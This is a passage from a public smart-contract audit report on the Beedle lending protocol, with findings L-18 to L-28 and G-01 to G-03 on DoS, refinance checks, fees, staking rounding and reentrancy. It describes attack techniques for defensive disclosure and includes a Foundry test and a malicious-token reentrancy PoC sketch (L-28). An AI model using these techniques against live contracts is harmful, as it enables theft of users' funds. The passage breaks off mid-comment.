### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L152

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L159

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L187

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L203

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L267

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L269

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L271

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L317

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L323

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L329

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L403

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L505

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L563

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L565

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L642

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L651

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L653

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L656

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L670

## Summary
Some tokens may be pausable making protocol unusable 

## Vulnerability Details
If collateralToken or loanTokens initialized are Pausable tokens such as example WBTC and if paused the Protocol will not function normally. There is no indication loanToken or collateralToken cant be Pausable tokens as any ERC20 can be initialized for pools; 

## Impact
Medium: If the token is paused then transfers of tokens into and out of the protocol are not possible, which impacts ability to deposit, ability to pay back, ability to move loans and all other such related functionality depending on transfer, transferFrom etc functions. 

The links added have cases where transfer and trasnferFrom take place such that functions in Lender.sol such as setPool() addPool() removePool() borrow() repay() giveLoan() buyLoan() refinance() dont work making the protocol not work

## Tools Used
Manual Analysis 

## Recommendations
It may be ideal to whitelist allowed tokens for loanToken and collateralTokens and not allow callback, hook, tokens such as ERC777, ERC1363,
It may be ideal to have safeguard measures on protocol e.g emergency patterns to activate them and protect protocol in the event of issues beyond control such as a token used in protocol being paused. 
## <a id='L-18'></a>L-18. User can DoS pool lender's withdrawals.

_Submitted by [Niki](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L198C1-L204C6

## Summary
Adversary can DoS pool withdrawals.

## Vulnerability Details
Upon a lender attempting to withdraw funds from their pool, a malicious user can front-run them and borrow all liquidity. Then the user can back-run the pool lender's transaction and repay the loan. Because of the small duration of the loan, the interest is negligible and the pool lender cannot withdraw their funds.

## Impact
Pool lender cannot withdraw their funds.

## Tools Used
Manual review

## Recommendations
Add a minimum interest fee, despite the length of the borrow in order to make this attack costly for the attacker. 
## <a id='L-19'></a>L-19. Possible DOS by borrowers in `setPool()`

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [amar](https://profiles.cyfrin.io/u/undefined), [kupiasec](https://profiles.cyfrin.io/u/undefined). Selected submission by: [kupiasec](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L145

## Summary
Lenders couldn't update already existing pools by borrowers who want to keep the original settings.

## Vulnerability Details
Lenders can update their pool settings using `setPool()`.

```solidity
    function setPool(Pool calldata p) public returns (bytes32 poolId) {
        // validate the pool
        if (
            p.lender != msg.sender ||
            p.minLoanSize == 0 ||
            p.maxLoanRatio == 0 ||
            p.auctionLength == 0 ||
            p.auctionLength > MAX_AUCTION_LENGTH ||
            p.interestRate > MAX_INTEREST_RATE
        ) revert PoolConfig();

        // check if they already have a pool balance
        poolId = getPoolId(p.lender, p.loanToken, p.collateralToken);

        // you can't change the outstanding loans
        if (p.outstandingLoans != pools[poolId].outstandingLoans) //@audit possible DOS by borrower
            revert PoolConfig();
    }
```

It checks if the new pool contains the same `outstandingLoans` as the old pool but it might revert due to borrowers.

1. A lender has a pool and there are several borrowers already.
2. After noticing the pool's interest ratio is too low, he's going to increase the rate using `setPool()`.
3. But borrowers don't want to pay higher interest and they front runs `borrow()` or `repay()` to change `outstandingLoans`.
4. Then `setPool()` will revert [here](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L145) because `outstandingLoans` was changed.

## Impact
Lenders couldn't update their pool settings properly.

## Tools Used
Manual Review

## Recommendations
I think we don't need to validate `outstandingLoans` in `setPool()`. Instead, we can set the old pool's `outstandingLoans` for the new pool [here](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L175).

```solidity
    p.outstandingLoans = pools[poolId].outstandingLoans;
    pools[poolId] = p;
```
## <a id='L-20'></a>L-20. Refinancing in the same pool requires it to have a higher balance than needed because of a flawed check

_Submitted by [khegeman](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [KrisApostolov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L616

## Summary

Refinancing a loan into the same pool it is in requires the pool to have `the original loan amount +- the difference` because it doesn't check whether the pool already has the original amount as outstanding debt.

## Vulnerability Details

`Lender.sol`'s `refinance()` has a check, which makes sure the pool we are refinancing into has enough liquidity to cover the new debt of the loan.

```solidity
if (pool.poolBalance < debt) revert LoanTooLarge();
```

The issue arises when the loan is getting refinanced in the same pool it is already in. Then it will require the pool to have the amount of the loan again instead of just the difference between the old debt and the new debt. This makes it harder for a loan to be refinanced in the same pool as the pool may not have enough liquidity to pass this check.

## Impact

Some loans will not be able to be properly refinanced.

## Tools Used

Manual Review

## Recommendations

Consider checking whether the loan's old pool is the new pool as well first and doing additional checks accordingly.
## <a id='L-21'></a>L-21. Interest calculation error if L2 sequencer go down 

_Submitted by [Juntao](https://profiles.cyfrin.io/u/undefined), [pks271](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined). Selected submission by: [pks271](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L720-L727


## Summary

Beedle Interest calculation depend on L2 sequencer, which will cause the interest calculation error if L2 sequencer go down.


## Vulnerability Details

In the current implementation, some functions includes `borrow`, `refinance` and `buyLoan`, etc. depend on `block.timestamp` to calculate the interest and `auction.startTimestamp`.

However, it's vulnerable when l2 sequencer go down cause that `block.timestamp` is unuseable. L2 chains like arbitrum and optimism upgrade their sequencer occasional, such as the recent [optimism bedrock upgrade](https://cryptopotato.com/optimism-bedrock-upgrade-release-date-revealed/) cause the sequencer can't be able to process transactions for several hours. Or l2 sequencer bug could also cause transactions in stuck, such as [arbitrum sequencer bug](https://beincrypto.com/arbitrum-sequencer-bug-causes-temporary-transaction-pause/). So it's necessary to implement an mechanism to handle this issue in some abnormal conditions. 


## Impact

Some related functions will not work normal when l2 sequencer go down.

## Tools Used

vscode, Manual Review

## Recommendations

Use chainlink [sequencer up feed](https://docs.chain.link/data-feeds/l2-sequencer-feeds), consider integrate the up time feed and give contract extra time when l2 sequencer go down.

## <a id='L-22'></a>L-22. Inability to refinance within the same pool due to exceeding the pool balance

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bernd](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L616

## Summary

The `refinance` function in the `Lender` contract allows a borrower to refinance a loan to a new offer. However, when refinancing within the same pool, the pool balance may not be sufficient as the balance is checked against the full debt, not the additional debt.

## Vulnerability Details

With the `refinance` function, a borrower can refinance the loan to a new offer (e.g., increasing or decreasing the debt). The loan can potentially be refinanced and assigned to a new pool, or the loan can be refinanced within the same pool. In either case, the pool balance is checked in line 616 to ensure the pool balance is sufficient to cover the total debt.

However, when refinancing within the same pool, the pool balance may not be sufficient as the balance is checked against the full debt, not the additional debt.

For instance, given a pool with an initial balance of `100 ether` ETH. A borrower borrows `90 ether` (pools balance is `10 ether` after creating the loan) and, after a while, attempts to refinance and increase the debt by an additional `10 ether` ETH, to a total debt of `100 ether` ETH.

At the time of the refinance, the pool's balance is `10 ether` ETH and checked if it's smaller than the loan's new `debt` in line 616. However, as `debt` is the total debt (`90 ether + 10 ether = 100 ether`), the check `10 ether < 100 ether` evaluates to true and thus reverts with the `LoanTooLarge` error, reverting the refinance attempt.

[Lender.sol#L616](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L616)

```solidity
591: function refinance(Refinance[] calldata refinances) public {
592:     for (uint256 i = 0; i < refinances.length; i++) {
593:         uint256 loanId = refinances[i].loanId;
594:         bytes32 poolId = refinances[i].poolId;
595:         bytes32 oldPoolId = keccak256(
596:             abi.encode(
597:                 loans[loanId].lender,
598:                 loans[loanId].loanToken,
599:                 loans[loanId].collateralToken
600:             )
601:         );
602:         uint256 debt = refinances[i].debt;
603:         uint256 collateral = refinances[i].collateral;
604:
605:         // get the loan info
606:         Loan memory loan = loans[loanId];
607:         // validate the loan
608:         if (msg.sender != loan.borrower) revert Unauthorized();
609:
610:         // get the pool info
611:         Pool memory pool = pools[poolId];
612:         // validate the new loan
613:         if (pool.loanToken != loan.loanToken) revert TokenMismatch();
614:         if (pool.collateralToken != loan.collateralToken)
615:             revert TokenMismatch();
616: @>      if (pool.poolBalance < debt) revert LoanTooLarge(); // @audit-info pool balance is potentially exceeded and reverts
617:         if (debt < pool.minLoanSize) revert LoanTooSmall();
618:         uint256 loanRatio = (debt * 10 ** 18) / collateral;
...          // [...]
```

## Impact

Refinancing a loan (i.e., increasing the debt) within the same pool potentially fails, leading to unutilized pool balance.

## Tools Used

Manual Review

## Recommendations

Consider removing the `if` statement checking the pool balance in line 616. In case the `debt` is larger than the current pool balance, updating the pool balance with the `_updatePoolBalance` function in line 636 would revert anyway.

Alternatively, consider only checking the pool balance for the additional debt in line 616.

## <a id='L-23'></a>L-23. Buying a loan always reverts at the start of an auction

_Submitted by [0xlemon](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L475-L478

## Summary

When the auction of a loan is at the its beginning no one can buy the loan because of the `currentAuctionRate`.

## Vulnerability Details

Current auction rate is calculated wrong in the `buyLoan` function. This prevents the users from buying a loan that is put for an auction.
Let's say that Alice (a lender) puts Bob's (borrower) loan for an auction. Alice set the auction length to be 2 days which means that the loan's `auctionLength` would be 2 days as well (it is set in the `borrow` function). Now let's imagine that a third person (we will call him Andy) wants to buy the loan as soon as the auction starts so after the `startAuction` function is called by Alice, Andy call `buyLoan` function to buy the loan in his already created pool. Andy won't be able to buy the loan because of the calculations inside the `buyLoan` function:

    uint256 currentAuctionRate = (MAX_INTEREST_RATE * timeElapsed) /
            loan.auctionLength; //@ audit rate is too high
        // validate the rate
        if (pools[poolId].interestRate > currentAuctionRate) revert RateTooHigh();

Let's see what the value of `currentAuctionRate` will be. The `MAX_INTEREST_RATE` = 100,000 and if `timeElapsed` is lower than `loan.autionLength / 100` the function will revert with `RateTooHigh` exception. This means that 1/100 of the `loan.autionLength` should have passed in order for the loan to be bought.

## Proof Of Concept

You need to add this `uint256[] loanIds;` and this `Borrow[] borrowArray;` as a storage variables in the test to work properly.
Add this test in the `Lender.t.sol` to see what is happening:

    function testBuyLoan() public {
        vm.startPrank(lender1);
        Pool memory p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 2 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p);
        vm.stopPrank();
        
        vm.startPrank(lender2);
        Pool memory p1 = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p1);
        vm.stopPrank();

        bytes32 poolId = lender.getPoolId(lender1, address(loanToken), address(collateralToken));
        bytes32 poolId2 = lender.getPoolId(lender2, address(loanToken), address(collateralToken));

        vm.startPrank(borrower);
        Borrow memory borrow = Borrow({
            poolId: poolId,
            debt: 200e18,
            collateral: 100e18
        });
        
        borrowArray.push(borrow);
        lender.borrow(borrowArray);
        vm.stopPrank();

        loanIds.push(0);

        vm.startPrank(lender1);
        lender.startAuction(loanIds);
        vm.stopPrank();

        vm.warp(block.timestamp + (2 days / 100) - 1);

        vm.startPrank(borrower);
        lender.buyLoan(0, poolId2);
        vm.stopPrank();

        (,,,,uint256 poolBalance,,,,) = lender.pools(poolId);
        (,,,,uint256 poolBalance2,,,,) = lender.pools(poolId2);

        console.log("Pool 1 balance: ", poolBalance);
        console.log("Pool 2 balanace: ", poolBalance2);
    }

In this test we try to buy the loan to another pool but we encounter a `RateTooHigh` exception. If we move the `block.timestamp` by one more second then we will be able to buy the loan and the transaction will succeed.

## Impact

This leads to the `buyLoan` function being blocked at the beginning of an auction.

## Tools Used

Visual Studio Code, Foundry

## Recommendations

Instead of doing this calculations just check if the `pools[poolId].interestRate > MAX_INTEREST_RATE`.
## <a id='L-24'></a>L-24. LoanId-ındex may lost cause of gas grief

_Submitted by [TorpedopistolIxc41](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232C4-L287C6

## Summary
loand-ıd has no real connection with the contract.
## Vulnerability Details
The exact number of events that can be emitted per transaction depends on the specific blockchain that is being used. However, it is typically around 100 events.

If the loans array becomes too large, the emit keyword will not be able to emit all of the events for the borrows. This means that some of the events may not be fired.
## Impact
Losing curicial loanIDs would lead to loss of collateral cause there's no getter function for borrowed loan's and traversing the array after certain amount of length is almost impossible cause the gas needed to do the computation.
## Tools Used
Foundry test-suit
## Recommendations
Checking the calldata length and evaluating the gas consumption in case of gas grief and revert the tx or creating mapping that maps the loanIds where the burrower takes so this way burrower can gain his loanıds easily 
## <a id='L-25'></a>L-25. [H-01] Fees collected can be sent to any address

_Submitted by [pina](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L74

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L100-L102

## Summary
The `feeReceiver` variable is declared in the constructor by the `msg.sender` it should be initialized with the address of the Fees contract.

## Vulnerability Details
By not initializing the `feeReceiver` variable, the fees can be sent to the contract owner and not to the Fees.sol contract that allows the exchange of tokens and take it to the staking contract.

With the initialization you had of msg.sender this would not happen.

## Impact
You would not be using the `Fees.sol` and `Staking.sol` contracts, preventing the correct functioning of the `Lender` contract.

## Tools Used
Manual code review

## Recommendations
Pass through the constructor the address of the contract Fees.sol
## <a id='L-26'></a>L-26. Griefing Attack via updateFor Function

_Submitted by [ubermensch](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L80-L94

## Summary
A vulnerability has been identified in the `updateFor` function, which can be exploited by an attacker to grief users with smaller deposits. The function, being public, allows anyone to call it for any address, potentially causing rounding errors that can lead to reduced or zero rewards for users with low deposits.

## Vulnerability Details
The updateFor function updates the rewards for a given recipient. Within the function, the reward share for the recipient is calculated using the formula:
uint256 _share = _supplied * _delta / 1e18;

If an attacker frequently calls the `updateFor` function for an address with a small deposit (_supplied), especially when the _delta (change in index) is small, the result of the multiplication can be much smaller than 1e18. Given Solidity's integer division, this can lead to the _share rounding down to zero. This means the recipient would not receive their rightful rewards, effectively being "grieved" by the attacker.

## Impact
Users with smaller deposits might receive fewer rewards or none at all due to the rounding down caused by frequent updates.

## Tools Used
Manual Review

## Recommendations
Introduce a minimum threshold for _delta to ensure that the reward calculation is meaningful and not prone to rounding errors.
## <a id='L-27'></a>L-27. Lenders could receive interest less than expected

_Submitted by [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L84-L87

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L92-L95

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L725

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L561

## Summary

If the `lenderFee` and `borrowerFee` variables are updated, the updated fees will be applied to every previously opened loan position, *not just newer loan positions*. All lenders could receive interest (yield) less than expected.

## Vulnerability Details

The `lenderFee` and `borrowerFee` variables can be set by an admin through the [`setLenderFee()`](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L84-L87) and the [`setBorrowerFee()`](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L92-L95), respectively. Whereas the `lenderFee` can be up to *5000* (50% fee), the `borrowerFee` can be up to *500* (5% fee).

If these variables are updated, the updated fees will be applied to every previously opened loan position, *not just newer loan positions*.

More specifically, when the `repay()`, `giveLoan()`, `buyLoan()`, `seizeLoan()`, or `refinance()`is executed, the updated fees will be applied. Consequently, lenders could receive interest (yield) less than expected.

```solidity
    function _calculateInterest(
        Loan memory l
    ) internal view returns (uint256 interest, uint256 fees) {
        uint256 timeElapsed = block.timestamp - l.startTimestamp;
        interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;
@>      fees = (lenderFee * interest) / 10000;
        interest -= fees;
    }
```
- `Use of the lenderFee`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L725

```solidity
    function seizeLoan(uint256[] calldata loanIds) public {
        for (uint256 i = 0; i < loanIds.length; i++) {
            ...

            // calculate the fee
@>          uint256 govFee = (borrowerFee * loan.collateral) / 10000;

            ...
        }
    }
```
- `Use of the borrowerFee`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L561

## Impact

All lenders could receive interest (yield) less than expected if the `lenderFee` and/or `borrowerFee` variables are updated (i.e., in case of increasing the fees) since the updated fees will be applied to every previously opened loan position, *not just newer loan positions*.

## Tools Used

Manual Review

## Recommendations

Consider applying the updated fees to only newer loan positions. 

An example idea for the solution is to populate the `lenderFee` and `borrowerFee` parameters during creating a loan and record them in the `Loan` struct. These parameters will be static and used for a particular loan only.
## <a id='L-28'></a>L-28. Critical Reentrancy Vulnerability Enabling Sequential Pool Updates and Total Fund Withdrawal

_Submitted by [engineer](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
An acute reentrancy vulnerability has been identified within the `setPool` function of the Lender smart contract. The issue originates from the combination of the pool update process and the premature invocation of external contract calls (through the transfer method) prior to the completion of internal contract state updates. This sequence allows for the possibility of reentry before the `setPool` function's execution cycle is fully complete, paving the way for potential exploitation. In a worst-case scenario, a malicious contract could masquerade as a lender, enact a series of updates on their created pool, and consequently drain all the loan tokens the **contract** has. This attack may then be replicated across numerous loan token contracts, posing a severe risk to the entire protocol.


## Vulnerability Details / POC
Let's suppose that the `Lender` contract has amassed a significant quantity of an `HonestLoanToken`, with a total balance of `10000 HonestLoanTokens`, attributed to multiple honest lenders who've created pools for the `HonestLoanToken`. However, these lenders, lacking tech-savviness, didn't realize that the ERC20 token is fraught with malicious code.

Recognizing an opportunity, Bob, the attacker, legitimately creates a pool by calling `setPool`.

```solidity
Lender lender = ILender(LENDER_CONTRACT_ADDRESS);

/// @notice poolBalance
Pool memory pool = Pool({
    lender: attacker,
    loanToken: address(loanToken),
    collateralToken: address(collateralToken),
    ...
    poolBalance: 100 * 10 ** 18,
    ...
    outstandingLoans: 0
});

lender.setPool(pool);

```

Subsequently, Bob flips the `evil_switch` and in his malicious contract, which could appear as follows:

```solidity
...
Lender lender = ILender(LENDER_CONTRACT_ADDRESS);

contract HonestLoanToken is IERC20 {
    ...

    function transfer(address to, uint256 amount) external returns (bool) {
        if (evil_switch && balanceOf(lender) > 1) {
            // @notice poolBalance must be less than the original value
            // Lender will transfer the difference of the two values to Bob.
            Pool memory pool = Pool({
                lender: lender1,
                loanToken: address(loanToken),
                collateralToken: address(collateralToken),
                ...
                poolBalance: 30 * 10 ** 18,
                ...
                outstandingLoans: 0
            });

            // Re-enter
            lender.setPool(pool);
        }
        _transfer(to, amount);
    }

    ...
}
```

Provided the `poolBalance` in the transfer call is less than the one Bob originally created, he will be able to invoke the `else if (p.poolBalance < currentBalance) {...}` section of the `setPool` method. This is significant because it will enable the `Lender` contract to transfer funds to Bob. And, due to the `setPool` call to an external function, Bob can re-enter `setPool`. Since `setPool` doesn't update its state until after the `transfer` method has finished executing, the condition `else if (p.poolBalance < currentBalance) {...}` still holds true even after re-entry. This permits Bob to siphon off funds until none remains.

## Impact
This will affect other innocent lenders.

## Tools Used
Manual code review, Foundry

## Recommend Mitigation
Follow Checks-Effects-Interactions pattern. Move the line of code that updates the storage prior to making the `transfer` calls.

# Gas Optimizations / Informationals

## <a id='G-01'></a>G-01. `Staked` struct is created but never used

_Submitted by [ke1cam](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [ke1cam](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Structs.sol#L68-L79

## Summary
I think it could be implemented in file Staking.sol, but it isn't, which makes him unused.

## Vulnerability Details
Unused struct can increase gas cost while deploying the contract.

## Impact
The gas is being wasted.

## Tools Used
Manual Analysis, VScode

## Recommendations
Implement Staked struct in desired contracts. Otherwise delete it if you are not planing to use it.
## <a id='G-02'></a>G-02. Move the Duplicate Checks into a Modifier

_Submitted by [charlescheerful](https://profiles.cyfrin.io/u/undefined), [touqeershah32](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [kral01](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [ericselvig](https://profiles.cyfrin.io/u/undefined), [0xanjan143](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [0xanjan143](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L183

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L199

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L211

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L222

## Summary
  
   The functions addToPool(), removeFromPool(), updateMaxLoanRatio(), and updateInterestRate() contain repeated checks to 
   verify if the caller is the poolId lender. These checks can be extracted into a modifier that takes an address as an 
   input parameter. By doing this, the code can benefit from improved code reusability, readability, and easier 
   maintenance.   

## Vulnerability Details

   There is no vulnerability in the code. However, the current implementation lacks readability.

## Impact

   The current implementation of the code lacks readability, making it harder to maintain.

## Tools Used

   Manual Inspection

## Recommendations]

   Extract the duplicated checks into a separate modifier. Doing so will enhance code readability and promote better code 
   maintenance. By reusing the modifier, you can avoid redundancy and improve the overall structure of the contract.
## <a id='G-03'></a>G-03. User can steal reward tokens if the Staking contract uses tokens with different decimals

_Submitted by [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [0xmuxyz](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined). Selected submission by: [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L61-L76

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L80-L94

## Summary
The index calculations in `update()` and `updateFor()` functions in `Staking.sol` are valid only for tokens with 18 decimals.

## Vulnerability Details
The current implementation of `Staking.sol` is assuming to use TKN and WETH tokens, but if we need a different token from this it may break the index calculations, and will be able to claim the reward and also to withdraw his deposited tokens.

## PoC (Proof-Of-Concept)
```solidity
/// @notice update the global index of earned rewards

/* @audit
 * - Lets TKN and WETH are 18 decimals, we have 10WETH inside the contract
 *   We will deposit 100 TKN with 18 decimals via deposit function, 
 *	 it will call updateFor with msg.sender -> update()
 *   the totalSupply of TKN will be in 18 decimals the balance of WETH also.
 *   The _diff variable will be balanceOf WETH in the contract because its first deposit and balance state variable is 0,
 *   then the _ratio = (18 decimals _diff) * 1e18 / (18 decimals TKN totalSupply) = 0.1 (100,000,000,000,000,000 with 18 decimals).
 *   Index will be also with 18 decimals and everything is fine.
 *   Then the body of updateFor continue and __supplied will be 0 so it set supplyIndex for him to current index or 0.1 in this case.
 *   
 *   In future actions let's say deposit again with 50TKN
 *   it will skip update function because the second if will be false cuz WETH amount isn't changed,
 *   _supplied will be 100e18 from last deposit, _delta will be 0 an function will end.
 *   What if add more WETH?
 *   Lets add 15WETH and deposit 50TKN again.
 *   It the _diff will be 15 (25WETH - 10WETH). _ratio = 15e18 * 1e18 / 200e18 = 0.075 (75,000,000,000,000,000 in decimals).
 *   Index will be now 0.1 + 0.075 = 0.175 (175,000,000,000,000,000 in decimals) and balance will be updated to 25 * 1e18
 *   _supplied = 150e18, _supplyIndex = 0.1 (100,000,000,000,000,000), then the supplyIndex for this user will be set to 0.175 (175,000,000,000,000,000 in decimals). 
 *   _ delta = 0.175 (175,000,000,000,000,000 in decimals) - 0.1 (100,000,000,000,000,000) = 0.075 (75,000,000,000,000,000 in decimals).
 *   _share = 150e18 * 0.075 (75,000,000,000,000,000 in decimals) / 1.18 = 11,250,000,000,000,000,000 (11,25)
 *   claimable for this user will be set to this.
 *
 *   ----------------
 *   
 *   Now let's use TKN with 24 decimals and WETH with 10 decimals
 *   Again will deposit 100 TKN and will have already 10WETH
 *   totalSupply will be 100 * 1e24 and _balance will be 10 * 1*10
 *   _diff will be the balance of WETH, because it's the first deposit.
 *   then the _ratio = 10 * 1*10 * 1e18 / (100 * 1e24) = 1,000 - how much decimals? confusion
 *   Index will be set to 1000. supplyIndex[msg.sender] = index (1000 in this case).
 *   Next deposit with 50TKN, will fail cuz WETH amount isn't changed,
 *   _supplied will be 100e24 from last deposit, _delta will be 0 an function will end.
 *   Lets add 15WETH and deposit 50TKN again.
 *   Now the _diff will be 15 (25WETH - 10WETH with 10 decimals). 
 *   _ratio = 15e10 * 1e18 / 200e24 = 750 (how many decimals 10, 18, 24???).
 *   index will be updated to 1750.
 *   _supplied = 150e24, _supplyIndex = 1000, then the supplyIndex for this user will be set to 1750.
 *   _delta = 1750 - 1000 = 750.
 *   _share = 150e24 * 750 / 1e18 = 112,500,000,000,
 *   claimable is set to 112,500,000,000.
 *   Then let's call claim function
 *   updateFor(msg.sender) is called first,
 *   We already know this function so the result is that in the second if end, because WETH amount doesn't change.
 *   _supplied = 1750. _delta will be 0 and will end.
